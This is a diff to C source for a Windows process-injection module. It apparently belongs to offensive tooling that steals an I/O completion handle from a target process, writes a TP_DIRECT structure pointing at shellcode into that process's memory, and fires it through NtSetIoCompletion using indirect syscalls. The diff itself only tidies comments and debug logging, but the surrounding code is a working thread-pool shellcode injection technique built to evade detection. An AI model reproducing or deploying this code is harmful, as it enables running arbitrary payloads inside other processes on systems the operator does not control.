@@ -6,11 +6,11 @@
 #include <unwin.h>
 
 #include <stdio.h>
-
 #include <ThreadPool.h>
 
 #include "injection.h"
 #include "../syscalls/syscalls.h"
+#include "../debugging/debugging.h"
 
 extern Ade GlobalAde;
 
@@ -21,7 +21,9 @@ HANDLE DuplicateHandleK(HANDLE hproc, int pPid, int handleType) {
     ULONG return_sz = 0;
     PSYSTEM_HANDLE_INFORMATION_EX handle_table = malloc(0);
     
-    // [ Get System Handles ]
+    //
+    // Get System Handles
+    //
     do {
         handle_table = realloc(handle_table, return_sz);
         status = NtQuerySystemInformation(
@@ -32,7 +34,9 @@ HANDLE DuplicateHandleK(HANDLE hproc, int pPid, int handleType) {
         );
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
-    // [ Clone the handle ]
+    //
+    // Clone the handle
+    //
     for (int i = 0; i < handle_table->NumberOfHandles; i++) {
         PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = malloc(0);
         SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle_info = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)handle_table->Handles[i];
@@ -51,9 +55,7 @@ HANDLE DuplicateHandleK(HANDLE hproc, int pPid, int handleType) {
                 FALSE,
                 0
             )) {
-#ifdef DEBUG
-                    printf("ERROR: DuplicateHandle (0x%x)\n", GetLastError());
-#endif
+                DEBUG_ERROR("DuplicateHandle: 0x%lx", GetLastError());
                 return NULL;
             }
 
@@ -69,7 +71,10 @@ int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellco
     tpDirect.Callback = ptrShellcode;
     AdeSinner sinner;
 
-    // [ Create the remote TpDirect ]
+    //
+    // Create the remote TpDirect
+    //
+
     PTP_DIRECT remoteTpDirect = NULL;
     SIZE_T AllocSize = sizeof(TP_DIRECT);
     CallAde(sinner, "NtAllocateVirtualMemory", NTSTATUS status,
@@ -82,13 +87,13 @@ int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellco
     );
 
     if (remoteTpDirect == NULL || status != 0x0) {
-#ifdef DEBUG
-        printf("Invalid Allocation: 0x%x\n", status);
-#endif
+        DEBUG_ERROR("Invalid Allocation: 0x%lx", status);
         return -1;
     }
 
-    // [ Write local TpDirect to the remoteTpDirect ]
+    //
+    // Write local TpDirect to the remoteTpDirect
+    //
     CallAde(sinner, "NtWriteVirtualMemory", status,
         targetProcHandle,
         remoteTpDirect,
@@ -98,9 +103,7 @@ int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellco
     );
 
     if (status != 0x0) {
-#ifdef DEBUG
-        printf("WriteProcessMemory ERROR: 0x%x\n", GetLastError());
-#endif
+        DEBUG_ERROR("WriteProcessMemory 0x%lx", GetLastError());
         return -1;
     }
 
@@ -116,9 +119,7 @@ int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellco
     );
 
     if (status != 0x0) {
-#ifdef DEBUG
-        printf("NtSetIoCompletion ERROR: 0x%x\n", status);
-#endif
+        DEBUG_ERROR("NtSetIoCompletion 0x%lx", status);
         return -1;
     }
 
